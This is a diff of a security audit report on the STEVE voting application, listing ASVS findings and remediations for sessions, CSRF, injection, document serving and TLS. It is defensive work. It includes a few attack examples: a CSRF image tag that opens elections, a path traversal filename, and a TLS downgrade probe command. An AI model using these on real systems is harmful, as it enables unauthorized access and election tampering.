+| **CWE** | N/A |
+| **ASVS Sections** | 7.1.1 |
+| **Files** | v3/server/pages.py:82, v3/server/main.py:null |
+| **Source Reports** | 7.1.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The provided code contains: 1. No session inactivity timeout configuration — sessions are read and used without checking last activity time. 2. No absolute maximum session lifetime — no expiration timestamp is validated. 3. No documentation of session timeout decisions or justifications for deviations from NIST SP 800-63B. 4. No reference to NIST SP 800-63B re-authentication requirements. NIST SP 800-63B Section 4.1.3 specifies: Session inactivity timeout of 30 minutes for AAL1, Re-authentication at least every 12 hours for AAL1, Shorter timeouts for higher assurance levels. For an election system handling sensitive operations, the lack of session timeouts means: A session could persist indefinitely after a user walks away from their computer, No forced re-authentication protects against session theft that occurred hours/days ago, There's no documented risk analysis justifying this design.
+
+**Remediation:**
+
+1. Document session timeout decisions with a Session Management Policy including: Inactivity Timeout of 30 minutes for general operations (NIST SP 800-63B AAL1 compliant) and 15 minutes for election management operations; Absolute Maximum Lifetime of 12 hours maximum session duration with re-authentication required for election creation/opening/closing. 2. Implement session timeout enforcement in the basic_info() function to check absolute timeout (12 hours), inactivity timeout (30 minutes), and update last activity timestamp on each request. Destroy session and abort with 401 if either timeout is exceeded.
+
+---
+
+#### FINDING-019: No inactivity timeout configuration exists in the application
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.3.1 |
+| **Files** | v3/server/pages.py:entire file, v3/server/main.py:44-48 |
+| **Source Reports** | 7.3.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+No inactivity timeout configuration exists in the application code. The `asfquart` framework is used for session management, but no session idle timeout is configured at the application level. The `basic_info()` function reads session data without checking any timestamp for last activity. User authenticates via OAuth → Session established → No timestamp tracking → Session remains valid indefinitely regardless of inactivity. An attacker who obtains a session cookie (e.g., via physical access to an unattended workstation) can reuse it hours or days later since no inactivity timeout forces re-authentication.
+
+**Remediation:**
+
+Configure session timeout in app configuration (main.py create_app()): app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(minutes=30) and app.config['SESSION_REFRESH_EACH_REQUEST'] = True. Alternatively, implement custom middleware with @APP.before_request decorator to check session timeout by tracking 'last_active' timestamp in session data.
+
+---
+
+#### FINDING-020: No absolute maximum session lifetime configured
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.3.2 |
+| **Files** | v3/server/pages.py:entire file, v3/server/main.py:44-48 |
+| **Source Reports** | 7.3.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+No absolute maximum session lifetime is configured anywhere in the application code. The create_app() function in main.py constructs the application without setting any session lifetime limits. User authenticates → Session created with no creation timestamp or max lifetime → Session persists until browser closes (or indefinitely if persistent cookies are used). A session token obtained through any means (XSS, cookie theft, network interception) remains valid indefinitely. Even if the OAuth token expires at the identity provider, the local application session continues without re-authentication.
+
+**Remediation:**
+
+In main.py create_app(): Set absolute maximum session lifetime (e.g., 8 hours) using app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(hours=8). Or implement session creation timestamp check using @APP.before_request decorator to check session age and destroy sessions exceeding MAX_SESSION_LIFETIME (e.g., 28800 seconds for 8 hours).
+
+---
+
+#### FINDING-021: Active sessions not terminated when user accounts are disabled or deleted
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L1 |
 | **CWE** | N/A |
-| **ASVS Sections** | 12.1.1 |
-| **Files** | v3/server/main.py:75-78 |
-| **Source Reports** | 12.1.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 7.4.2 |
+| **Files** | v3/server/bin/asf-load-ldap.py:36-63, v3/server/pages.py:null |
+| **Source Reports** | 7.4.2.md |
+| **Related Findings** | None |
 
-The application starts with whatever TLS versions the underlying framework (Quart/Hypercorn) defaults to. Without explicit configuration, older TLS versions (TLS 1.0, TLS 1.1) may be negotiable depending on the runtime environment and library versions. Config values for certfile and keyfile are passed directly to app.run() without any TLS protocol version constraints. An attacker can attempt handshake with deprecated TLS versions using openssl s_client -connect localhost:58383 -tls1_1.
+**Description:**
+
+The LDAP loading script (asf-load-ldap.py) performs a full synchronization of user data from LDAP into the local database, but contains no logic to detect removed accounts or terminate their active sessions. The script only adds/updates persons. When a user is removed from the organization (removed from LDAP), their active sessions are not terminated. The person's record persists in the local database, and any active sessions remain valid. In an election system, this could allow former members to participate in votes they should no longer have access to.
 
 **Remediation:**
 
-Explicitly configure minimum TLS protocol version and prefer TLS 1.3. For Hypercorn (the ASGI server used in run_asgi()), configure via hypercorn.toml or programmatically: create an SSL context with ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.minimum_version = ssl.TLSVersion.TLSv1_2; ctx.maximum_version = ssl.TLSVersion.TLSv1_3; ctx.load_cert_chain(certfile, keyfile). For config.yaml, add server.min_tls_version: '1.2'.
+Modify the LDAP synchronization script to track current LDAP users, identify removed users by comparing existing database UIDs with current LDAP UIDs, disable removed accounts in the local database, and invalidate all active sessions for disabled users. Implement a disable_person method in the PersonDB class and a session invalidation mechanism to terminate all sessions when an account is disabled or deleted.
 
 ---
 
-#### FINDING-042: No Cipher Suite Configuration - Weak Ciphers May Be Negotiated
+#### FINDING-022: No logout endpoint defined in application
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2, L3 |
+| **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 12.1.2 |
-| **Files** | v3/server/main.py:75-82 |
-| **Source Reports** | 12.1.2.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 7.4.4 |
+| **Files** | v3/server/pages.py:entire file |
+| **Source Reports** | 7.4.4.md |
+| **Related Findings** | None |
 
-The application has no control over which cipher suites are enabled. Without explicit cipher suite configuration, weak ciphers may be negotiated. Depending on the Python/OpenSSL version, this could allow: Non-forward-secrecy ciphers (e.g., RSA key exchange), Weak encryption algorithms (e.g., 3DES, RC4), Weak hash algorithms in cipher suites (e.g., SHA-1 based MACs). For L3 compliance, the application MUST only support cipher suites providing forward secrecy (ECDHE/DHE key exchange).
+**Description:**
+
+No logout endpoint is defined in the application. Without a logout endpoint, it is impossible for templates to provide functional logout access, regardless of what the template HTML contains. The `basic_info()` function populates template data for authenticated pages but includes no logout URL. User wants to logout → No logout URL provided to templates → No logout endpoint exists → User cannot terminate session. An authenticated user on any page (e.g., `/voter`, `/admin`, `/manage/<eid>`) has no way to terminate their session through the application interface.
 
 **Remediation:**
 
-Create an SSL context with explicit cipher suite configuration. Use ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) with minimum_version = ssl.TLSVersion.TLSv1_2. Set ciphers to only allow strong cipher suites with forward secrecy: 'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS:!RC4:!3DES'. Load certificate chain using ctx.load_cert_chain(certfile, keyfile).
+1. Add logout endpoint at /logout that calls asfquart.session.destroy() and redirects to /. 2. Provide logout URL to all templates in basic_info() function. 3. Ensure navbar template includes visible logout button/link.
 
 ---
 
-#### FINDING-043: TLS Configuration is Optional - Application Allows Plain HTTP
+#### FINDING-023: No mechanism for users to view or terminate active sessions
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.5.2 |
+| **Files** | v3/server/pages.py:594, v3/server/pages.py:603 |
+| **Source Reports** | 7.5.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application provides no mechanism for users to view their active sessions or terminate them. The `/profile` page and `/settings` page only render basic templates without session management functionality. There is no session listing endpoint or session termination endpoint. Users cannot detect if their account has been compromised by viewing concurrent sessions. If a session is hijacked (e.g., through cookie theft or XSS), users have no self-service mechanism to invalidate that session. In an election context, this could allow an attacker to maintain persistent access and vote on behalf of the user.
+
+**Remediation:**
+
+Implement session listing and termination endpoints. Add a `/sessions` GET endpoint that lists all active sessions for the current user. Add a `/sessions/terminate/<session_id>` POST endpoint that requires re-authentication before allowing session termination. The termination endpoint should verify the session belongs to the requesting user and call session invalidation server-side.
+
+---
+
+#### FINDING-024: No Step-Up Authentication for Highly Sensitive Election Management Operations
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.5.3 |
+| **Files** | v3/server/pages.py:484, v3/server/pages.py:505, v3/server/pages.py:462 |
+| **Source Reports** | 7.5.3.md |
+| **Related Findings** | None |
+
+**Description:**
+
+Highly sensitive election management operations (opening, closing, and creating elections) are performed without any additional authentication or secondary verification beyond the initial session. These are irreversible or highly impactful operations in an election system. An attacker with a hijacked session cookie could open or close elections by simply issuing GET requests. Elections can be opened (making them available for voting), closed (ending voting periods), or created without any additional verification. In the context of organizational governance, premature opening or closing of elections could affect democratic outcomes.
+
+**Remediation:**
+
+Implement step-up authentication for sensitive operations. Change do_open_endpoint and do_close_endpoint from GET to POST. Require re-authentication if last_auth_time exceeds 5 minutes. Verify ownership by checking metadata.owner_pid against result.uid.
+
+---
+
+#### FINDING-025: State-changing operations use HTTP GET instead of POST, enabling CSRF attacks
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L1, L2, L3 |
+| **CWE** | CWE-352 |
+| **ASVS Sections** | 8.2.1, 8.3.1, 8.4.2, 6.3.4, 2.3.1 |
+| **Files** | v3/server/pages.py:450-466, v3/server/pages.py:470-486, v3/server/pages.py:482, v3/server/pages.py:503, v3/server/pages.py:450-465, v3/server/pages.py:470-485 |
+| **Source Reports** | 8.2.1.md, 8.3.1.md, 8.4.2.md, 6.3.4.md, 2.3.1.md |
+| **Related Findings** | FINDING-113 |
+
+**Description:**
+
+State-changing operations (opening and closing elections) use HTTP GET instead of POST, making them vulnerable to CSRF via image tags, link prefetching, browser prefetching, and other non-interactive GET request vectors. If an authenticated user visits a malicious page, their browser will send GET requests that can open or close elections without their knowledge or consent. Web crawlers could accidentally trigger these operations. Combined with the missing authorization checks, any committer's browser visiting a malicious page containing &lt;img src='https://steve.apache.org/do-open/EID'&gt; triggers the action with no CSRF token validation.
+
+**Remediation:**
+
+Change /do-open/&lt;eid&gt; and /do-close/&lt;eid&gt; from GET to POST methods (@APP.post). Implement CSRF token validation by calling validate_csrf_token(await quart.request.form) at the start of each endpoint. Add CSRF token validation to all state-changing endpoints. Ensure all forms submitting to these endpoints include the CSRF token. Replace the placeholder csrf_token = 'placeholder' with cryptographic CSRF token generation using secrets.token_urlsafe(32) and store it in the session. Implement async def validate_csrf_token(form_data) that uses hmac.compare_digest to validate the token from form submissions against the session token.
+
+---
+
+#### FINDING-026: Vote submission endpoint lacks explicit voter eligibility check before processing
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L1, L2, L3 |
+| **CWE** | CWE-285 |
+| **ASVS Sections** | 8.2.2, 8.3.1 |
+| **Files** | v3/server/pages.py:407-430, v3/steve/election.py:254, v3/server/pages.py:410-456, v3/steve/election.py:268 |
+| **Source Reports** | 8.2.2.md, 8.3.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The voting endpoint lacks an explicit authorization check before processing votes. While election.add_vote() will implicitly fail if the user has no mayvote entry (via AttributeError on None when accessing mayvote.salt), this is not a proper security control—it's an unhandled exception that may expose stack traces or cause inconsistent error handling. Authorization relies on an implicit side-effect rather than an explicit check. This is a Type C gap where the control (mayvote lookup) is called but its result isn't explicitly validated. The pattern is fragile and a code refactor could silently remove the protection. The implicit failure may expose internal error details, provides a confusing error message, creates a timing side-channel, and relies on implementation accident rather than intentional security control.
+
+**Remediation:**
+
+Add explicit eligibility check in add_vote() method. Check if mayvote is None and raise a custom VoterNotEligible or NotEligibleToVote exception before attempting to access mayvote.salt. This provides intentional security control with proper error handling. Example: if mayvote is None: raise NotEligibleToVote(f'User {pid} is not eligible to vote on issue {iid}').
+
+---
+
+#### FINDING-027: Single shared database with no tenant-level data isolation
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | CWE-566 |
+| **ASVS Sections** | 8.4.1 |
+| **Files** | v3/schema.sql:, v3/steve/election.py: |
+| **Source Reports** | 8.4.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+All elections for all organizational groups share a single SQLite database (steve.db). The authz field provides logical tenancy, but there is no row-level security in SQLite and query methods like list_closed_election_ids return ALL elections without tenant filtering. Administrative functions (like tallying via CLI) have access to ALL elections across all tenant boundaries. While CLI access is documented as intentional, the list_closed_election_ids method has no tenant parameter, meaning any code calling it gets cross-tenant data. This creates a risk of cross-tenant data leakage in administrative operations.
+
+**Remediation:**
+
+Add tenant filtering to list_closed_election_ids() and other cross-election queries. Example: @classmethod def list_closed_election_ids(cls, db_fname, authz_filter=None, include_open=False): db = cls.open_database(db_fname); if authz_filter: db.q_closed_election_ids_by_authz.perform(authz_filter); eids = [row.eid for row in db.q_closed_election_ids_by_authz.fetchall()]; else: # Only for admin CLI with explicit authorization; db.q_closed_election_ids.perform(); eids = [row.eid for row in db.q_closed_election_ids.fetchall()]; return eids. Implement tenant filtering in election queries used by the web interface.
+
+---
+
+#### FINDING-028: No continuous identity verification or re-authentication for sensitive administrative operations
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L3 |
+| **CWE** | CWE-306 |
+| **ASVS Sections** | 8.4.2 |
+| **Files** | v3/server/pages.py:multiple |
+| **Source Reports** | 8.4.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+ASVS 8.4.2 requires 'continuous consumer identity verification' for administrative interfaces. The system performs identity verification only once at session creation. Critical operations such as opening an election (irreversible), closing an election (irreversible), and deleting issues are performed with the same session token as reading a profile page, with no additional verification. No step-up authentication, no session age check, no re-authentication, and no verification that the session hasn't been hijacked since creation. This violates the requirement for multiple layers of security for administrative interfaces.
+
+**Remediation:**
+
+Implement async def require_recent_auth(max_age_seconds=300) that checks the session's auth_time and requires re-authentication if the session is older than the specified threshold (e.g., 5 minutes for sensitive operations). Apply this check to all irreversible administrative operations including do_open_endpoint, do_close_endpoint, and do_delete_issue_endpoint. Store auth_time in session at login and validate it before critical operations.
+
+---
+
+#### FINDING-029: HTML Attribute Injection in doc: Filename Pattern
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L1, L2 |
+| **CWE** | CWE-79 |
+| **ASVS Sections** | 1.2.1, 1.3.1, 1.2.2, 5.3.2, 5.4.2 |
+| **Files** | v3/server/pages.py:52-60, v3/server/pages.py:66 |
+| **Source Reports** | 1.2.1.md, 1.3.1.md, 1.2.2.md, 5.3.2.md, 5.4.2.md |
+| **Related Findings** | FINDING-118, FINDING-119, FINDING-133 |
+
+**Description:**
+
+The `rewrite_description()` function extracts filenames from issue descriptions using a regex pattern `doc:([^\s]+)` and constructs URL paths without sanitization. While filenames originate from authorized users (committers storing issue descriptions), a malicious committer could craft a description containing path traversal sequences in the `doc:` pattern. A committer could store an issue description containing `doc:../../sensitive-file` which generates a link to `/docs/<iid>/../../sensitive-file`. When a voter clicks this link, it would be handled by `serve_doc()` where framework-level safe_join would prevent traversal, but the link itself could confuse users or be used in social engineering.
+
+**Remediation:**
+
+Validate extracted filenames against a safe pattern and HTML-encode them. Example implementation: python
+def rewrite_description(issue):
+    import re
+    SAFE_DOCNAME_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9._-]*$')
+    desc = issue.description
+    def repl(match):
+        filename = match.group(1)
+        if not SAFE_DOCNAME_RE.match(filename):
+            return f'[invalid doc reference]'
+        from markupsafe import escape
+        safe_filename = escape(filename)
+        return f'&lt;a href="/docs/{issue.iid}/{safe_filename}"&gt;{safe_filename}&lt;/a&gt;'
+    desc = re.sub(r'doc:([^\s]+)', repl, desc)
+    issue.description = f'&lt;pre&gt;{desc}&lt;/pre&gt;'
+
+---
+
+#### FINDING-030: Missing vote string validation before encryption and storage
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L1, L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 12.2.1, 12.3.1, 12.2.2 |
-| **Files** | v3/server/config.yaml.example:6-12, v3/server/main.py:72-82 |
-| **Source Reports** | 12.2.1.md, 12.3.1.md, 12.2.2.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 1.3.3, 2.2.1, 2.3.2, 16.5.3 |
+| **Files** | v3/steve/election.py:243 |
+| **Source Reports** | 1.3.3.md, 2.2.1.md, 2.3.2.md, 16.5.3.md |
+| **Related Findings** | None |
 
-The configuration explicitly documents that TLS can be disabled by leaving certfile and keyfile fields blank. When running without TLS, session cookies are transmitted in cleartext (session hijacking), OAuth tokens and credentials are exposed, vote data is transmitted unencrypted, no mechanism exists to redirect HTTP to HTTPS, and no HSTS header enforcement is visible in the code. This is a voting application handling sensitive election data—running without TLS completely undermines confidentiality and integrity.
+**Description:**
+
+The comment '### validate VOTESTRING for ISSUE.TYPE voting' explicitly acknowledges that vote format validation is not implemented. For YNA issues, the votestring should be constrained to valid options (e.g., 'yes', 'no', 'abstain'). For STV issues, the votestring should be a valid ranking format. Without validation, arbitrary strings are encrypted and stored. This is a fail-open condition — the validation logic is commented as TODO, meaning transactions proceed despite the absence of critical validation. Impact: Corrupted tally results if vtypes.tally() cannot handle invalid vote strings, Potential DoS if the tally function crashes on malformed votes, Election integrity compromised if invalid votes are counted.
 
 **Remediation:**
 
-Enforce TLS at startup by modifying main.py to require TLS configuration and fail with a clear error if certificates are missing or invalid. Example code:
-
-```python
-if not app.cfg.server.certfile or not app.cfg.server.keyfile:
-    _LOGGER.critical('TLS certificates MUST be configured. Set server.certfile and server.keyfile in config.yaml')
-    sys.exit(1)
-
-kwargs['certfile'] = CERTS_DIR / app.cfg.server.certfile
-kwargs['keyfile'] = CERTS_DIR / app.cfg.server.keyfile
-```
+def add_vote(self, pid: str, iid: str, votestring: str): md = self._all_metadata(self.S_OPEN); issue = self.q_get_issue.first_row(iid); if not issue: raise IssueNotFound(iid); m = vtypes.vtype_module(issue.type); if not m.validate_vote(votestring, self.json2kv(issue.kv)): raise InvalidVote(f'Invalid vote format for type {issue.type}'); mayvote = self.q_get_mayvote.first_row(pid, iid); if not mayvote: raise VoterNotAuthorized(pid, iid); ...
 
 ---
 
-#### FINDING-044: Election Title and Issue Title/Description Have No Server-Side Length or Content Validation
+#### FINDING-031: User-supplied scriptable content not sanitized in issue descriptions
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
-| **ASVS Level(s)** | L1 |
+| **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 2.2.1 |
-| **Files** | v3/server/pages.py:410-425, v3/server/pages.py:469-490, v3/server/pages.py:493-515 |
-| **Source Reports** | 2.2.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 1.3.5 |
+| **Files** | v3/server/pages.py:60-70, v3/server/pages.py:299 |
+| **Source Reports** | 1.3.5.md |
+| **Related Findings** | None |
 
-User-supplied text fields (election title, issue title, issue description) are passed directly to the database without any validation in `do_create_endpoint()`, `do_add_issue_endpoint()`, and `do_edit_issue_endpoint()`. Extremely long titles could cause display issues, memory exhaustion, or denial of service. Empty titles violate logical expectations (NOT NULL ≠ non-empty). No character set validation allows control characters or other problematic content. Affects the `gather_election_data()` anti-tamper hash — maliciously crafted titles could cause issues.
+**Description:**
+
+The `doc:filename` pattern is a custom expression/template language within user content. The application processes this pattern to generate HTML links but: 1. Does not sanitize or disable other potentially dangerous patterns 2. Does not strip HTML/CSS/JavaScript from the description 3. The raw user content (minus `doc:` substitution) is rendered as HTML in the browser. User-supplied content is rendered as active HTML, allowing CSS injection (visual manipulation, data exfiltration via CSS selectors), HTML injection (phishing content), and script injection (full XSS as covered in 1.3.1).
 
 **Remediation:**
 
-Add server-side validation for title and description fields: strip whitespace, check for non-empty values, enforce maximum length limits (title: 200 characters, description: 10,000 characters). Return error messages via flash_danger and redirect on validation failure. Consider adding database CHECK constraints for length limits as defense-in-depth.
+Implement HTML sanitization: First, escape ALL HTML in the description using html.escape(). Then safely process the doc: pattern on the escaped content. Ensure filenames are URL-encoded when placed in href attributes. Example: python
+import html
+import re
+import urllib.parse
+
+def rewrite_description(issue):
+    # First, escape ALL HTML in the description
+    desc = html.escape(issue.description)
+    
+    # Now safely process the doc: pattern (on escaped content)
+    def repl(match):
+        filename = match.group(1)
+        safe_filename = html.escape(filename)
+        url_filename = urllib.parse.quote(filename, safe='')
+        return f'&lt;a href="/docs/{issue.iid}/{url_filename}"&gt;{safe_filename}&lt;/a&gt;'
+    desc = re.sub(r'doc:([^\s]+)', repl, desc)
+    
+    issue.description = f'&lt;pre&gt;{desc}&lt;/pre&gt;'
 
 ---
 
-#### FINDING-045: Document Filename (docname) Relies Solely on Framework Protection Without Explicit Validation
+#### FINDING-032: Document filename (docname) relies solely on framework protection without explicit validation
 
 | Attribute | Value |
 |-----------|-------|
@@ -879,70 +645,19 @@ Add server-side validation for title and description fields: strip whitespace, c
 | **ASVS Sections** | 2.2.1 |
 | **Files** | v3/server/pages.py:560-574 |
 | **Source Reports** | 2.2.1.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The `serve_doc()` endpoint serves files based on user-supplied `iid` and `docname` parameters. While `send_from_directory` provides framework-level path traversal protection, the code explicitly acknowledges missing validation with a TODO comment. The `docname` parameter could contain special characters, encoded sequences, or reference symlinks. The `iid` parameter constructs a directory path without validating that it's a valid 10-char hex string. Depending on framework version and edge cases, this could lead to unauthorized file access outside the intended document directory.
+**Description:**
 
-**Remediation:**
-
-Implement explicit validation for `docname`: use a regex pattern to allow only alphanumeric characters, hyphens, underscores, and dots (e.g., `^[a-zA-Z0-9_\-][a-zA-Z0-9_\-\.]{0,254}$`). Reject filenames starting with dots or containing `..` sequences. Return HTTP 400 for invalid filenames before calling `send_from_directory`.
-
----
-
-#### FINDING-046: Multi-Vote Submission Not Wrapped in Transaction — Partial Failure Leaves Inconsistent State
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 2.3.3, 16.5.3 |
-| **Files** | v3/server/pages.py:372 |
-| **Source Reports** | 2.3.3.md, 16.5.3.md |
-| **Related Findings** | None | **Description:**
-
-User submits ballot with 10 issues → Loop processes votes one by one → Vote #5 fails → Votes #1-4 already committed → User told "error" but partial votes persist. Atomic ballot submission is not guaranteed. A voter's intent is a complete ballot, but partial submission creates an inconsistent state where some issues have new votes and others retain old votes. This violates the principle that business operations should succeed entirely or roll back.
+The endpoint serves files based on user-supplied `iid` and `docname` parameters. While `send_from_directory` provides framework-level path traversal protection, the code explicitly acknowledges missing validation with a TODO comment. The `iid` parameter constructs a directory path (`DOCSDIR / iid`) without validating that `iid` is actually a valid 10-char hex string. Additionally, `docname` could contain special characters, encoded sequences, or be a symlink target if the filesystem allows. Depending on framework version and edge cases, this could lead to unauthorized file access outside the intended document directory.
 
 **Remediation:**
 
-Wrap all votes in a transaction:
-
-```python
-election.db.conn.execute('BEGIN TRANSACTION')
-try:
-    for iid, votestring in votes.items():
-        election.add_vote(result.uid, iid, votestring)
-    election.db.conn.execute('COMMIT')
-except Exception as e:
-    election.db.conn.execute('ROLLBACK')
-    _LOGGER.error(f'Vote batch failed: {e}')
-    await flash_danger('Error submitting votes. Please try again.')
-    return quart.redirect(f'/vote-on/{election.eid}', code=303)
-```
+Implement explicit validation for `docname` using an allowlist pattern. Reject hidden files and directory traversal attempts. Example: `VALID_DOCNAME = re.compile(r'^[a-zA-Z0-9_\-][a-zA-Z0-9_\-\.]{0,254}$'); if not VALID_DOCNAME.match(docname): quart.abort(400); if docname.startswith('.') or '..' in docname: quart.abort(400)`
 
 ---
 
-#### FINDING-047: Election Open Operation Not Fully Atomic — Salt Addition and State Change in Separate Transactions
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 2.3.3, 15.4.2 |
-| **Files** | v3/steve/election.py:70 |
-| **Source Reports** | 2.3.3.md, 15.4.2.md |
-| **Related Findings** | None | **Description:**
-
-The open() method performs a non-atomic sequence where it checks if the election is editable (is_editable()), then writes salts (add_salts()), and finally changes the election state (c_open.perform()). No transaction wraps this sequence. If two administrators call open() concurrently, both can pass the is_editable() check before either changes the state. This leads to: T1: Admin A calls open(), passes is_editable() check; T2: Admin B calls open(), also passes is_editable() check; T3: Admin A's add_salts() runs, writes salts; T4: Admin B's add_salts() runs, OVERWRITES salts with different values; T5: Admin A's c_open.perform() runs with opened_key based on original salts; T6: Admin B's c_open.perform() runs, overwrites opened_key. The result is that opened_key and salts are inconsistent, breaking tamper detection and preventing proper tallying.
-
-**Remediation:**
-
-Wrap the entire open() operation in a BEGIN IMMEDIATE transaction. Re-check the election state within the transaction using _all_metadata() to ensure the state hasn't changed. If the state is not editable, rollback and raise ElectionBadState. Integrate add_salts() operations into the same transaction (remove its internal transaction). Include proper exception handling with ROLLBACK on error and COMMIT on success.
-
----
-
-#### FINDING-048: No Validation That close_at Is After open_at When Setting Dates
+#### FINDING-033: No validation that close_at is after open_at when setting dates
 
 | Attribute | Value |
 |-----------|-------|
@@ -950,350 +665,983 @@ Wrap the entire open() operation in a BEGIN IMMEDIATE transaction. Re-check the 
 | **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
 | **ASVS Sections** | 2.2.3 |
-| **Files** | v3/server/pages.py:88-110, v3/steve/election.py |
+| **Files** | v3/server/pages.py:88-110, v3/steve/election.py:null |
 | **Source Reports** | 2.2.3.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-When setting open_at or close_at dates, the application does not validate the logical relationship between them. A user can set close_at to Jan 1, 2024 and then set open_at to Feb 1, 2024, resulting in close_at < open_at which is logically inconsistent. This is a Type A gap where no cross-field consistency validation exists.
+**Description:**
+
+When setting open_at or close_at dates, the application does not validate the logical relationship between them. Users can set close_at to Jan 1, 2024 and then set open_at to Feb 1, 2024, resulting in close_at < open_at which is logically inconsistent. The _set_election_date() function accepts date values independently without checking against the other date field.
 
 **Remediation:**
 
-Add validation in _set_election_date() to check cross-field consistency. When setting open_at, verify it is before any existing close_at. When setting close_at, verify it is after any existing open_at. Return a 400 error with descriptive message if the validation fails.
+Validate cross-field consistency by checking that open_at is before close_at when setting either field. Retrieve the existing date value for the other field and compare before allowing the update. Return a 400 error if the new date would create an invalid combination.
 
 ---
 
-#### FINDING-049: No file size validation or upload limits enforced
+#### FINDING-034: User-uploaded documents served inline without Content-Disposition header
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L1, L2 |
+| **CWE** | CWE-646 |
+| **ASVS Sections** | 3.2.1, 5.4.1 |
+| **Files** | v3/server/pages.py:621-635 |
+| **Source Reports** | 3.2.1.md, 5.4.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The serve_doc() endpoint accepts a user-submitted filename via the docname URL parameter and uses it directly to serve files. There is no validation or sanitization of this filename, and no explicit Content-Disposition header is set in the response to override the user-controlled filename. The framework's default behavior uses the actual file's name for Content-Type inference, but the URL-visible filename remains user-controlled. Without explicit filename validation: 1) The Content-Type of the response is derived from the user-controlled filename extension, which could cause browser behavior differences, 2) If the response includes a Content-Disposition header, the user-controlled filename could contain injection characters, 3) The lack of explicit Content-Disposition means the browser uses the URL's filename segment for Save As operations.
+
+**Remediation:**
+
+Implement explicit filename validation using an allowlist regex (e.g., ^[a-zA-Z0-9][a-zA-Z0-9._-]*$) and reject requests with invalid filenames. Serve files with explicit Content-Disposition header using as_attachment=True in send_from_directory(). Add X-Content-Type-Options: nosniff header for defense-in-depth. Implement file extension allowlist to only serve known-safe extensions (.pdf, .txt, .md, etc.) and prevent serving executable or HTML content.
+
+---
+
+#### FINDING-035: JavaScript String Injection in STV_CANDIDATES Object
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L1 |
 | **CWE** | N/A |
-| **ASVS Sections** | 5.2.1 |
-| **Files** | v3/server/pages.py (entire application scope) |
-| **Source Reports** | 5.2.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 3.2.2 |
+| **Files** | v3/server/templates/vote-on.ezt:280-295 |
+| **Source Reports** | 3.2.2.md |
+| **Related Findings** | None |
 
-The application serves documents via `/docs/<iid>/<docname>` but has no visible file upload endpoint with size validation. The mechanism by which documents are placed into `DOCSDIR` is not shown in the provided code, meaning there are no observable file size checks that would prevent a denial of service via excessively large files. If files are uploaded through an undocumented mechanism, no size limits are enforced by the shown code. Additionally, the Quart application does not set `MAX_CONTENT_LENGTH` (or equivalent) to limit request body size globally, which would affect any file upload functionality added in the future.
+**Description:**
+
+The template renders issue titles, candidate labels, and candidate names directly into JavaScript string literals WITHOUT using EZT's `[format "js,html"]` escape filter. If any of these values contain a double-quote, backslash, or newline, they break out of the string context. Database values (issue title, candidate label/name) flow through EZT template rendering without JS escaping into an inline &lt;script&gt; block, creating JavaScript string literal injection.
 
 **Remediation:**
 
